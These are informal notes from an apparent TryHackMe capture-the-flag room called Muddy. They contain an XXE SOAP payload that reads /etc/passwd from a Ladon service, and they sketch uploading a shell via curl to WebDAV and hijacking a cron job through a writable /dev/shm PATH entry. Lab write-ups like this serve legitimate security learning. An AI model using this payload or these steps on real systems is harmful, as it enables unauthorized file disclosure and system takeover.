THM/ladon python exploit from searchsploit, writable folder in path of ..etc..crontab MUDDY

```
<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
<soapenv:Body>
<urn:sayhello soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>
</urn:sayhello>
</soapenv:Body>
</soapenv:Envelope>
```

according to tthe website we saw a checkout function ..so sayhello i to be changed to checkout

and localhost to ip

we swa a directory webdav and the location was /var/www/html/passwd.dav  and got in

now we can upload via curl our file and get shell

we saw /dev/shm was in path for cronjob and pspy said netstat was being on cronjob so we amde a file and got shell
